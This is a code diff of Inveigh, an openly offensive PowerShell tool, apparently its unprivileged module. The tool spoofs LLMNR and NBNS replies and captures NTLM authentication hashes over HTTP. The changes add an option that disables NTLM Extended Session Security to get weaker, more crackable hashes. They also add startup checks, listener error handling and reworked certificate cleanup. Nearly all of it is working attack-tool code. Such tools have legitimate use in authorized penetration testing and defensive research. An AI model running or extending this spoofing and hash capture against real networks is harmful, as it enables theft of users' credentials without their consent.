@@ -79,10 +79,8 @@ Default = Any: IP address for the HTTP listener.
 Default = 80: TCP port for the HTTP listener.
 
 .PARAMETER HTTPAuth
-Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type. This setting does not apply to
-wpad.dat requests. Note that Microsoft has changed the behavior of WDAP through NBNS in the June 2016 patches. A
-WPAD enabled browser may now trigger NTLM authentication after sending out NBNS requests to random hostnames and
-connecting to the root of the HTTP listener.
+Default = NTLMESS: (Anonymous,Basic,NTLM,NTLMNoESS) HTTP/HTTPS server authentication type. This setting does not apply to
+wpad.dat requests. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation.
 
 .PARAMETER HTTPBasicRealm
 Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.
@@ -92,8 +90,8 @@ String or HTML to serve as the default HTTP/HTTPS response. This response will n
 Use PowerShell character escapes where necessary.
 
 .PARAMETER WPADAuth
-Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
-Anonymous can prevent browser login prompts.
+Default = NTLMESS: (Anonymous,Basic,NTLM,NTLMNoESS) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
+Anonymous can prevent browser login prompts. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation.
 
 .PARAMETER WPADEmptyFile
 Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests.
@@ -160,6 +158,9 @@ Default = Unlimited: (Integer) Run time duration in minutes.
 .PARAMETER RunCount
 Default = Unlimited: (Integer) Number of captures to perform before auto-exiting.
 
+.PARAMETER StartupChecks
+Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.
+
 .PARAMETER ShowHelp
 Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
 
@@ -201,11 +202,12 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WPADEmptyFile = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
-    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$HTTPAuth = "NTLM",
-    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$WPADAuth = "NTLM",
+    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$HTTPAuth = "NTLM",
+    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$WPADAuth = "NTLM",
     [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$NBNSTypes = @("00","20"),
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NBNSBruteForceTarget = "",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP = "",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
@@ -233,7 +235,8 @@ param
 
 if ($invalid_parameter)
 {
-    throw "$($invalid_parameter) is not a valid parameter."
+    Write-Output "Error:$($invalid_parameter) is not a valid parameter"
+    throw
 }
 
 if($NBNSBruteForce -eq 'Y')
@@ -244,7 +247,8 @@ if($NBNSBruteForce -eq 'Y')
 
 if($NBNSBruteForce -eq 'Y' -and !$NBNSBruteForceTarget)
 {
-    throw "You must specify a -NBNSBruteForceTarget if enabling -NBNSBruteForce"
+    Write-Output "Error:You must specify a -NBNSBruteForceTarget if enabling -NBNSBruteForce"
+    throw
 }
 
 if(!$SpooferIP)
@@ -257,12 +261,14 @@ if($WPADIP -or $WPADPort)
 
     if(!$WPADIP)
     {
-        throw "You must specify a -WPADPort to go with -WPADIP"
+        Write-Output "Error:You must specify a -WPADPort to go with -WPADIP"
+        throw
     }
 
     if(!$WPADPort)
     {
-        throw "You must specify a -WPADIP to go with -WPADPort"
+        Write-Output "Error:You must specify a -WPADIP to go with -WPADPort"
+        throw
     }
 
 }
@@ -292,7 +298,8 @@ if(!$inveigh)
 
 if($inveigh.unprivileged_running)
 {
-    throw "Invoke-InveighUnprivileged is already running, use Stop-Inveigh"
+    Write-Output "Error:Invoke-InveighUnprivileged is already running, use Stop-Inveigh"
+    throw
 }
 
 if(!$inveigh.running -or !$inveigh.relay_running)
@@ -304,11 +311,11 @@ if(!$inveigh.running -or !$inveigh.relay_running)
     $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
     $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
     $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
-    $inveigh.certificate_application_ID = $HTTPSCertAppID
-    $inveigh.certificate_thumbprint = $HTTPSCertThumbprint
     $inveigh.console_output = $false
     $inveigh.console_input = $true
     $inveigh.file_output = $false
+    $inveigh.HTTPS_existing_certificate = $false
+    $inveigh.HTTPS_force_certificate_delete = $false
     $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
     $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
     $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
@@ -362,7 +369,10 @@ else
 $inveigh.status_queue.Add("Inveigh Unprivileged started at $(Get-Date -format 's')") > $null
 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Unprivileged started")])  > $null
 
-$firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
+if($StartupChecks -eq 'Y')
+{
+    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
+}
 
 if($firewall_status)
 {
@@ -380,7 +390,10 @@ if($firewall_status)
 
 if($LLMNR -eq 'Y')
 {
-    $LLMNR_port_check = netstat -anp UDP | findstr 0.0.0.0:5355
+    if($StartupChecks -eq 'Y')
+    {
+        $LLMNR_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
+    }
 
     if(!$LLMNR_port_check)
     {
@@ -475,11 +488,10 @@ else
 
 if($HTTP -eq 'Y')
 {
-    $HTTP_port_check += netstat -anp TCP | findstr 0.0.0.0:$HTTPPort
     
-    if($HTTPIP)
+    if($StartupChecks -eq 'Y')
     {
-        $HTTP_port_check += netstat -anp TCP | findstr $HTTPIP`:$HTTPPort
+        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
     }
 
     if($HTTP_port_check)
@@ -490,7 +502,7 @@ if($HTTP -eq 'Y')
     else
     {
 
-        if($HTTPIP)
+        if($HTTPIP -ne '0.0.0.0')
         {
             $inveigh.status_queue.Add("HTTP IP Address = $HTTPIP") > $null
         }
@@ -730,7 +742,7 @@ $HTTP_scriptblock =
 
     function NTLMChallengeBase64
     {
-        param ([String]$Challenge)
+        param ([String]$Challenge,[Bool]$NTLMESS)
 
         $HTTP_timestamp = Get-Date
         $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
@@ -752,8 +764,18 @@ $HTTP_scriptblock =
 
         $inveigh.HTTP_challenge_queue.Add($HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + $HTTP_client.Client.RemoteEndpoint.Port + ',' + $HTTP_challenge)  > $null
 
+        if($NTLMESS)
+        {
+            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x89,0x0a
+        }
+        else
+        {
+            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x81,0x0a
+        }
+
         $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
-                            0x00,0x00,0x00,0x05,0x82,0x89,0xa2 +
+                            0x00,0x00,0x00 +
+                            $HTTP_NTLM_negotiation_flags +
                             $HTTP_challenge_bytes +
                             0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                             0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
@@ -774,7 +796,7 @@ $HTTP_scriptblock =
         return $NTLM
     }
 
-    if($HTTPIP)
+    if($HTTPIP -ne '0.0.0.0')
     {
         $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)
         $HTTP_endpoint = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)
@@ -784,8 +806,19 @@ $HTTP_scriptblock =
         $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
     }
 
+    $HTTP_running = $true
     $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
-    $HTTP_listener.Start()
+    
+    try
+    {
+        $HTTP_listener.Start()
+    }
+    catch
+    {
+        $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting HTTP listener")
+        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting HTTP listener")])
+        $HTTP_running = $false
+    }
 
     $HTTP_WWW_authenticate_header = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20 # WWW-Authenticate
     $run_count_NTLMv1 = $RunCount + $inveigh.NTLMv1_list.Count
@@ -822,7 +855,7 @@ $HTTP_scriptblock =
 
     $HTTP_client_close = $true
 
-    :HTTP_listener_loop while ($inveigh.unprivileged_running)
+    :HTTP_listener_loop while ($inveigh.unprivileged_running -and $HTTP_running)
     {
         $TCP_request = ""
         $TCP_request_bytes = New-Object System.Byte[] 1024
@@ -890,6 +923,15 @@ $HTTP_scriptblock =
                 $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
             }
 
+            if(($HTTP_request_raw_url -match '/wpad.dat' -and $WPADAuth -eq 'NTLM') -or ($HTTP_request_raw_url -notmatch '/wpad.dat' -and $HTTPAuth -eq 'NTLM'))
+            {
+                $HTTPNTLMESS = $true
+            }
+            else
+            {
+                $HTTPNTLMESS = $false
+            }
+
             $HTTP_type = "HTTP"
             $NTLM = "NTLM"
             $NTLM_auth = $false
@@ -910,7 +952,7 @@ $HTTP_scriptblock =
                 if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                 {
                     $HTTP_response_status_code = 0x34,0x30,0x31
-                    $NTLM = NTLMChallengeBase64 $Challenge
+                    $NTLM = NTLMChallengeBase64 $Challenge $HTTPNTLMESS
                     $HTTP_client_close = $false
                 }
                 elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
@@ -921,7 +963,7 @@ $HTTP_scriptblock =
                     $HTTP_NTLM_domain_length = DataLength2 28 $HTTP_request_bytes
                     $HTTP_NTLM_domain_offset = DataLength4 32 $HTTP_request_bytes
                     [String]$NTLM_challenge = $inveigh.HTTP_challenge_queue -like $HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + '*'
-                    $HTTP_challenge_queue.Remove($NTLM_challenge)
+                    $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                     $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(",")) + 1)
                        
                     if($HTTP_NTLM_domain_length -eq 0)
@@ -1077,7 +1119,7 @@ $HTTP_scriptblock =
             $HTTP_timestamp = Get-Date -format r
             $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)
 
-            if(($HTTPAuth -eq 'NTLM' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -eq 'NTLM' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$NTLM_auth)
+            if(($HTTPAuth -like 'NTLM*' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$NTLM_auth)
             { 
                 $NTLM = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
                 $HTTP_message_bytes = 0x0d,0x0a
@@ -1199,14 +1241,27 @@ $LLMNR_spoofer_scriptblock =
 {
     param ($LLMNR_response_message,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$LLMNRTTL)
 
+    $LLMNR_running = $true
     $LLMNR_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,5355)
-    $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient 5355
+
+    try
+    {
+        $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient 5355
+    }
+    catch
+    {
+        $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting LLMNR spoofer")
+        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting LLMNR spoofer")])
+        $LLMNR_running = $false
+    }
+
     $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
     $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
     $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
 
-    while($inveigh.unprivileged_running)
+    while($inveigh.unprivileged_running -and $LLMNR_running)
     {   
+
         $LLMNR_request_data = $LLMNR_UDP_client.Receive([Ref]$LLMNR_listener_endpoint) # need to switch to async
 
         if([System.BitConverter]::ToString($LLMNR_request_data[($LLMNR_request_data.Length - 4)..($LLMNR_request_data.Length - 3)]) -ne '00-1c') # ignore AAAA for now
@@ -1287,12 +1342,25 @@ $NBNS_spoofer_scriptblock =
 {
     param ($NBNS_response_message,$SpooferIP,$NBNSTypes,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$NBNSTTL)
 
+    $NBNS_running = $true
     $NBNS_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)
-    $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
+
+    try
+    {
+        $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
+    }
+    catch
+    {
+        $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting NBNS spoofer")
+        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting NBNS spoofer")])
+        $NBNS_running = $false
+    }
+
     $NBNS_UDP_client.Client.ReceiveTimeout = 5000
 
-    while($inveigh.unprivileged_running)
+    while($inveigh.unprivileged_running -and $NBNS_running)
     {
+        
         $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint) # need to switch to async
 
         if([System.BitConverter]::ToString($NBNS_request_data[10..11]) -ne '00-01')
@@ -1970,7 +2038,7 @@ if($inveigh)
         if($inveigh.unprivileged_running)
         {
             $inveigh.unprivileged_running = $false
-            Start-Sleep -s 5
+            Start-Sleep -S 2
             Write-Output("Inveigh Unprivileged exited at $(Get-Date -format 's')")
             $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited")  > $null
 
@@ -1984,6 +2052,7 @@ if($inveigh)
         if($inveigh.relay_running)
         {
             $inveigh.relay_running = $false
+            Start-Sleep -S 2
             Write-Output("Inveigh Relay exited at $(Get-Date -format 's')")
             $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited")  > $null
 
@@ -2015,27 +2084,45 @@ if($inveigh)
     
     if($inveigh.HTTPS)
     {
-        & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null
+        $certificate_check = & "netsh" http show sslcert
 
-        try
+        if($certificate_check)
         {
-            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
-            $certificate_store.Open('ReadWrite')
-            $certificate = $certificate_store.certificates.Find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
-            $certificate_store.Remove($certificate)
-            $certificate_store.Close()
+            $netsh_ipport = "ipport=" + $inveigh.HTTPS_IP + ":" + $inveigh.HTTPS_port
+            $netsh_arguments = @("http","delete","sslcert",$netsh_ipport)
+            & "netsh" $netsh_arguments > $null
         }
-        catch
-        {
-            Write-Output("SSL Certificate Deletion Error - Remove Manually")
-            $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
 
-            if($inveigh.file_output)
+        if(!$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))
+        {
+
+            try
             {
-                "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
+                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
+                $certificate_store.Open('ReadWrite')
+                $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})
+
+                ForEach($certificate in $certificates)
+                {
+                    $certificate_store.Remove($certificate)
+                }
+
+                $certificate_store.Close()
+            }
+            catch
+            {
+                Write-Output("SSL Certificate Deletion Error - Remove Manually")
+                $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
+
+                if($inveigh.file_output)
+                {
+                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
+                }
+
             }
 
         }
+
     }
 
     $inveigh.HTTP = $false
